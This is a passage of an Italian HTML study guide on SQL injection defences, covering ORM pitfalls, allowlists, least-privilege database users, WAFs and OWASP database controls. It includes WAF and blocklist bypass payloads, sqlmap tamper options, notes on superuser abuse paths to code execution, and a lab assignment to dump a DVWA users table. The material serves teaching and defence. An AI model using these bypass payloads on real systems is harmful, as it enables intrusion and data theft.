+<div class="deep-dive">Caveat ORM-specific: <strong>SQLAlchemy</strong> <code>text()</code> con string interpolation è vulnerabile — serve <code>text().bindparams()</code>. <strong>Django</strong> <code>raw()</code> accetta <code>params=</code> come terzo argomento, ma molti developer lo dimenticano. <strong>Sequelize</strong> <code>query()</code> con <code>replacements={}</code> usa bind; con literal è raw concat. <strong>LINQ</strong> su .NET Entity Framework è quasi sempre sicuro nativo, ma <code>ExecuteSqlCommand</code> con string interpolation è vulnerabile.</div>
+
+<div class="box">Audit pragmatico: <code>grep -r 'raw(' src/</code> è il primo step di code review SQLi su app ORM. Politica sana: raw SQL richiede code review dedicata + test con payload SQLi classici.</div>
+</section>
+
+<section id="14"><h2>14 · Difesa 3 · Input Validation (allowlist)</h2>
+<p>Difesa <strong>secondaria</strong>, mai da sola. Serve per contesti dove prepared non basta (identificatori dinamici come nomi tabella/colonna, <code>ORDER BY</code>).</p>
+
+<div class="compare">
+<div class="good">
+<div class="title">✓ ALLOWLIST — definisci cosa è lecito</div>
+<pre><span class="cmt"># Ordering: solo colonne note</span>
+ALLOWED = {'name', 'email', 'date'}
+
+sort = request.args.get('sort')
+if sort not in ALLOWED:
+    sort = 'name'  <span class="cmt"># default safe</span>
+
+query = f"SELECT ... ORDER BY {sort}"
+<span class="cmt"># sort è in lista finita: concat sicura</span></pre>
+</div>
+<div class="bad">
+<div class="title">✗ BLOCKLIST — bloccare parole "cattive"</div>
+<pre>BAD = ['SELECT','UNION','DROP']
+
+def sanitize(s):
+    for b in BAD:
+        s = s.replace(b,'')
+    return s
+
+<span class="cmt"># Bypass banali:</span>
+<span class="vuln">SELSELECTECT → dopo replace = SELECT
+sElEcT / SEL%20ECT / UNION#SELECT</span></pre>
+</div>
+</div>
+
+<h3>Regola aurea</h3>
+<div class="box">Allowlist (lista chiusa di valori validi) è robusta. Blocklist è intrinsecamente fragile — c'è sempre un bypass. Principio: <strong>se puoi enumerare i valori leciti, enumerali</strong>.</div>
+
+<h3>Pattern di allowlist efficace</h3>
+<ul>
+<li>Lista chiusa di valori</li>
+<li>Default safe quando input non matcha</li>
+<li>Error handling che non dice "unsafe input" al client (feedback all'attaccante)</li>
+<li>Validazione all'ingresso del sistema (parameter binding, non in mezzo al codice)</li>
+</ul>
+
+<div class="deep-dive"><strong>Regex validation</strong>: utile per formati specifici — email, UUID, ISO date. Esempio per UUID: <code>^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$</code>. Se passa la regex → sicuro da concatenare.<br>
+<strong>Tipi forti aiutano</strong>: in Python typed cast <code>int(user_input)</code> fallisce con eccezione se non è un intero, bloccando SQLi con apostrofi. Stesso con UUID, date, enum.</div>
+
+<div class="warn">⚠ Validation NON sostituisce prepared — complementa. Se prepared è disponibile per il contesto, usare prepared; se non è possibile (es. ORDER BY dinamico), allora allowlist come secondo meccanismo.</div>
+</section>
+
+<section id="15"><h2>15 · Difesa 4 · Least Privilege sul DB user</h2>
+<p>Principio di privilegio minimo applicato al DB. L'app si collega al DB con un utente MINIMO: se la SQLi ha successo, il <strong>blast radius</strong> è contenuto.</p>
+
+<div class="compare">
+<div class="bad">
+<div class="title">✗ SBAGLIATO — app user = superuser</div>
+<pre><span class="cmt"># app.conf</span>
+DB_USER = postgres  <span class="cmt"># superuser</span>
+
+<span class="cmt"># Se SQLi:</span>
+• DROP TABLE users → data loss
+• COPY FROM PROGRAM → RCE
+• ALTER ROLE → privilege esc
+• pg_read_server_files → file system
+• Leggere TUTTI i DB</pre>
+</div>
+<div class="good">
+<div class="title">✓ CORRETTO — user dedicato, permessi minimi</div>
+<pre>CREATE USER app_runtime WITH
+    NOSUPERUSER NOCREATEDB
+    NOCREATEROLE NOREPLICATION
+    NOBYPASSRLS PASSWORD '...';
+
+GRANT CONNECT ON DATABASE app
+    TO app_runtime;
+GRANT USAGE ON SCHEMA public
+    TO app_runtime;
+GRANT SELECT, INSERT, UPDATE
+    ON users, orders TO app_runtime;
+<span class="cmt">-- NO DELETE, NO DROP, NO ALTER</span></pre>
+</div>
+</div>
+
+<h3>Pattern 3-user canonico</h3>
+<ul>
+<li><strong>app_runtime</strong> (app web): SELECT + INSERT + UPDATE sulle tabelle business. No DDL, no DELETE.</li>
+<li><strong>app_migration</strong> (CI/CD): DDL + permessi admin, attivato SOLO durante deployment via chiave separata (es. K8s Job one-shot).</li>
+<li><strong>app_readonly</strong> (reporting): SOLO SELECT, per Grafana/Metabase/analytics senza rischio di modifica.</li>
+</ul>
+
+<div class="deep-dive">Per i comandi pericolosi PostgreSQL: <code>REVOKE EXECUTE ON FUNCTION pg_read_server_files FROM app_runtime</code>; <code>REVOKE SUPERUSER</code> se per errore concesso; <code>DROP EXTENSION IF EXISTS</code> non-needed (<code>file_fdw</code>, <code>dblink</code>). Per MySQL: user senza FILE privilege per evitare LOAD_FILE(), senza PROCESS per evitare query enumeration, senza SUPER.</div>
+
+<div class="box"><strong>Menzione</strong>: Row-Level Security (RLS) in PostgreSQL permette granularità fine anche dentro la tabella — utente può vedere solo proprie righe. Ne parleremo in L9.</div>
+</section>
+
+<section id="16"><h2>16 · Difesa 5 · WAF</h2>
+<p><strong>Web Application Firewall</strong>: reverse proxy che ispeziona HTTP requests e blocca pattern sospetti PRIMA dell'app. Difesa perimetrale, <strong>ultima linea</strong>.</p>
+
+<h3>Cosa fa</h3>
+<p>Analizza HTTP request prima che arrivi all'app. Blocca pattern noti:</p>
+<ul>
+<li><code>UNION SELECT</code>, <code>DROP TABLE</code>, <code>OR 1=1</code></li>
+<li>encoding bypass: <code>%27</code>, <code>0x27</code></li>
+<li>obfuscation: <code>/*comments*/</code>, case mix</li>
+</ul>
+
+<h3>Tipi di WAF</h3>
+<ul>
+<li><strong>Cloud</strong>: AWS WAF, Cloudflare, Akamai, Azure Front Door</li>
+<li><strong>Reverse proxy</strong>: ModSecurity + OWASP Core Rule Set (CRS)</li>
+<li><strong>Moderno</strong>: CoraZa (Go, open-source, Apache 2.0, compatibile con ModSecurity rules)</li>
+</ul>
+
+<h3>Limiti (e perché NON basta)</h3>
+<div class="warn">
+<ul>
+<li><strong>Blocklist-based</strong>: bypass esistono per definizione</li>
+<li>Payload encoding/obfuscation funzionano contro WAF non aggiornati</li>
+<li>Falsi positivi: legitimate search con OR / UNION / SELECT viene bloccata</li>
+</ul>
+</div>
+
+<h3>Bypass classici</h3>
+<pre>UNION/**/SELECT    <span class="cmt">(commento inline)</span>
+UN%49ON SELECT     <span class="cmt">(%49 = 'I')</span>
+U%00NION SELECT    <span class="cmt">(null byte)</span>
+/*!50000 SELECT*/  <span class="cmt">(MySQL-specific)</span></pre>
+
+<div class="deep-dive">sqlmap ha <code>--tamper=N</code> con 60+ moduli di bypass WAF: <code>--tamper=space2comment,charunicodeencode,between</code> sostituisce spazi con <code>/**/</code>, encoding Unicode, operatori BETWEEN. Tecniche avanzate di bypass sono un'arte: (1) inline comments per spezzare keyword; (2) case mix sElEcT; (3) URL/Unicode encoding; (4) SQL functional equivalents — invece di <code>UNION SELECT</code>, <code>UNION ALL SELECT</code>; (5) syntax-specific per DBMS.</div>
+
+<h3>Uso corretto</h3>
+<div class="box">WAF = ULTIMA linea, mai prima. Serve per: rallentare attaccanti, ridurre noise, detection attacchi noti. NON sostituisce prepared statements.</div>
+
+<div class="deep-dive">Policy corretta: WAF in <strong>blocking mode</strong> per pattern high-confidence (OWASP CRS Paranoia Level 1); in <strong>detect-only mode</strong> per pattern ambigui per evitare falsi positivi; integrato con SIEM per alerting.</div>
+</section>
+
+<section id="17"><h2>17 · Defense in Depth — le 5 difese in architettura</h2>
+<p>Nessuna difesa da sola è sufficiente. L'approccio resiliente combina i 5 livelli, <strong>dal più forte al più debole</strong>.</p>
+
+<table>
+<tr><th>#</th><th>Difesa</th><th>Livello</th><th>Come</th></tr>
+<tr><td>1</td><td>Prepared Statements</td><td>Data access layer</td><td>separazione code/data strutturale</td></tr>
+<tr><td>2</td><td>ORM</td><td>Livello framework</td><td>prepared by default + abstraction</td></tr>
+<tr><td>3</td><td>Input Validation</td><td>All'ingresso</td><td>allowlist per identificatori</td></tr>
+<tr><td>4</td><td>LPP DB user</td><td>Nel DB</td><td>blast radius minimo</td></tr>
+<tr><td>5</td><td>WAF</td><td>Perimetrale</td><td>blocca pattern noti</td></tr>
+</table>
+
+<h3>Regola operativa</h3>
+<p>Costruire gli strati dal più forte al più debole:</p>
+<ul>
+<li><strong>1° prepared statement</strong> (strutturale)</li>
+<li><strong>2° ORM</strong> se disponibile</li>
+<li><strong>3° input validation</strong></li>
+<li><strong>4° LPP DB user</strong></li>
+<li><strong>5° WAF</strong> (ultimo, non sostitutivo)</li>
+</ul>
+
+<div class="box"><strong>Mitigation math</strong>: se prepared blocca il 99% degli attacchi SQLi, e LPP riduce l'impatto del restante 1% a "lettura selettiva di tabelle business" (zero RCE, zero data loss), il rischio residuo è basso. Aggiungendo WAF si intercettano anche attacchi automatizzati generici in fase di detection.</div>
+
+<p>Questo approccio è ciò che distingue un'app matura ("prepared + LPP + WAF + logging") da un'app hobbyista ("WAF solo").</p>
+</section>
+
+<section id="18"><h2>18 · OWASP Database Top 10 — controlli a livello DB</h2>
+<p>L'OWASP Database Top 10 è il complemento "infrastructure" del Top 10 applicativo. Copriamo i 4 controlli più impattanti nel contesto SQLi + DB security.</p>
+
+<h3>A01 · Broken Access Control → Row-Level Security (RLS)</h3>
+<p>PostgreSQL RLS permette policy per-row: l'utente vede solo righe che rispettano <code>CREATE POLICY</code>. Mitiga completamente SQLi su filtraggio authorization: anche se c'è bypass applicativo, RLS taglia a DB level.</p>
+<pre>CREATE POLICY users_own ON orders
+    USING (owner = current_user);</pre>
+<p>Anche se l'app user ha <code>SELECT</code> su <code>orders</code>, vede solo righe proprie.</p>
+
+<h3>A02 · Cryptographic Failures → TDE + bcrypt/argon2</h3>
+<p><strong>TDE</strong> (Transparent Data Encryption) cripta i datafile on disk — utile per scenari di furto fisico o backup compromessi.<br>
+<strong>Password hashing</strong>: bcrypt cost 12+, argon2id con salt random 16+ bytes, <strong>mai</strong> MD5/SHA1.</p>
+
+<div class="danger">La demo della mattina ha dimostrato: MD5 + rockyou.txt = secondi per crack. Un hash MD5 senza salt è equivalente a password in chiaro per un attaccante.</div>
+
+<h3>A07 · Auth Failures → pg_hba + scram-sha-256</h3>
+<p>Auth DB robusta (vista in L7): no <code>trust</code>, no <code>0.0.0.0/0</code>, <code>scram-sha-256</code> obbligatorio. L'app user separato da amministrazione.</p>
+
+<h3>A09 · Logging & Monitoring → pgAudit + log aggregati</h3>
+<p><strong>pgAudit</strong> logga ogni query con utente, timestamp, parametri. SQLi visibile come anomalia nei log: query lunghissime, UNION inaspettate, access pattern strani. Integrazione SIEM (Splunk, ELK, Datadog) per alerting in tempo reale.</p>
+
+<div class="box">L'assenza di monitoring è il motivo per cui molti breach via SQLi vengono scoperti mesi dopo. pgAudit è lo standard per audit trail su PostgreSQL — lo vedremo in dettaglio in L9.</div>
+
+<div class="deep-dive"><strong>Altri controlli OWASP DB Top 10</strong> (non coperti in L8, per approfondimento personale):<br>
+• <strong>A04</strong> Insecure Design — schema DB pensato senza threat model<br>
+• <strong>A05</strong> Security Misconfig — defaults insicuri<br>
+• <strong>A06</strong> Vulnerable Components — CVE su DBMS non patchato<br>
+• <strong>A08</strong> Integrity Failures — CI/CD pipeline per DB migrations<br>
+• <strong>A10</strong> SSRF — meno rilevante per DB</div>
+</section>
+
+<section id="compiti"><h2>📝 Compiti per L9 · lunedì 4 maggio 2026</h2>
+
+<h3>Consolida L8 — SQLi + Difese</h3>
+<ul>
+<li>🟢 <strong>PASSIVO</strong> · Leggi capitolo OWASP SQLi Prevention Cheat Sheet</li>
+<li>🟢 <strong>PASSIVO</strong> · Rivedi questa Guida Studente G8</li>
+<li>🔵 <strong>ATTIVO</strong> · Completa 18 esercizi consolida (esercizi-compiti-blocco1-g8.html)</li>
+<li>🔵 <strong>ATTIVO</strong> · Blog post: "le 3 SQLi che ho trovato in app legacy"</li>
+<li>🔴 <strong>PRATICO</strong> · Esegui sqlmap step-by-step su DVWA medium</li>
+<li>🔴 <strong>PRATICO</strong> · Fix due snippet con prepared statement</li>
+<li>🔴 <strong>DELIVERABLE</strong> · Screenshot dump tabella users + fix snippet</li>
+</ul>
+
+<h3>Prepara L9 — NoSQL + Audit</h3>
+<ul>
+<li>🟢 <strong>PASSIVO</strong> · Leggi "MongoDB security checklist"</li>
+<li>🟢 <strong>PASSIVO</strong> · Studia doc pgAudit extension</li>
+<li>🔵 <strong>ATTIVO</strong> · 16 esercizi NoSQL Injection (esercizi-compiti-blocco2-g8.html)</li>
+<li>🔵 <strong>ATTIVO</strong> · Diagramma architettura: WAF + DB + pgAudit</li>
+<li>🔴 <strong>PRATICO</strong> · Avvia container MongoDB 7 + PostgreSQL 16</li>
+<li>🔴 <strong>PRATICO</strong> · Installa pgAudit nel container PostgreSQL</li>
+<li>🔴 <strong>DELIVERABLE</strong> · Screenshot MongoDB running + pgAudit loaded</li>
+</ul>
+
+<div class="warn">📬 <strong>Deliverable obbligatori per L9</strong>: 2 screenshot + 2 fix snippet inviati via chat al formatore entro domenica 3 maggio sera.</div>
+</section>
+
+<section id="risorse"><h2>🔗 Risorse propedeutiche per G9</h2>
+
+<div class="resource">
+<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a>
+<div class="resource-meta">Tutte le difese applicative in un unico documento — riferimento canonico mondiale</div>
+</div>
+
+<div class="resource">
+<a href="https://github.com/sqlmapproject/sqlmap/wiki" target="_blank">sqlmap Wiki ufficiale</a>
+<div class="resource-meta">Flag CLI, tecniche, tamper scripts per WAF bypass, esempi pratici</div>
+</div>
+
+<div class="resource">
+<a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Academy</a>
+<div class="resource-meta">Corso interattivo gratuito con lab — il migliore per self-study</div>
+</div>
+
+<div class="resource">
+<a href="https://owasp.org/www-project-database-top-10/" target="_blank">OWASP Database Top 10</a>
+<div class="resource-meta">I 10 controlli a livello DB da implementare — complementare al Top 10 applicativo</div>
+</div>
+
+<div class="resource">
+<a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 2021 — A03 Injection</a>
+<div class="resource-meta">Categoria completa con CWE mappati, incidenza e impatto</div>
+</div>
+
+<div class="resource">
+<a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89 · SQL Injection</a>
+<div class="resource-meta">Definizione formale MITRE con esempi e mitigazioni</div>
+</div>
+
+<div class="resource">
+<a href="https://github.com/digininja/DVWA" target="_blank">DVWA · Damn Vulnerable Web Application</a>
+<div class="resource-meta">Progetto originale di Ryan Dewhurst — repo ufficiale GitHub</div>
+</div>
+
+<div class="resource">
+<a href="https://www.pgaudit.org/" target="_blank">pgAudit · PostgreSQL Audit Extension</a>
+<div class="resource-meta">Da installare prima di L9 — documentazione ufficiale</div>
+</div>
+
+<div class="resource">
+<a href="https://docs.mongodb.com/manual/administration/security-checklist/" target="_blank">MongoDB Security Checklist</a>
+<div class="resource-meta">Da leggere prima di L9 — principi di hardening per deployment</div>
+</div>
+
+</section>
+
+</div></body></html>
